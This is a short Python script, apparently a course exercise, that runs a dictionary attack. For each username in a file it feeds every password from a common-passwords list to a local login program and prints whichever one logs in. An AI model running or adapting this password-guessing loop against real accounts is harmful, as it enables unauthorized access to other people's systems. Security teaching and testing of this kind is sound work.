import subprocess
from datetime import datetime

def try_passwords(username, passwords):
    for password in passwords:
        output = subprocess.run(["python3", "Q2/Login.pyc", username, password], capture_output=True, text=True)
        if "Login successful" in output.stdout:
            return password

if __name__ == "__main__":
    with open("Q2/gang", "r") as f:
        usernames = f.read().split()

    with open("Q2/MostCommonPWs", "r") as f:
        passwords = f.read().split()

    print(f"Start time: {datetime.now()}\n")

    for username in usernames:
        print(f"{username:25s}", end="")
        password = try_passwords(username, passwords)
        if password is None:
            print("FAILED")
        else:
            print(password)

    print(f"\nEnd time: {datetime.now()}")
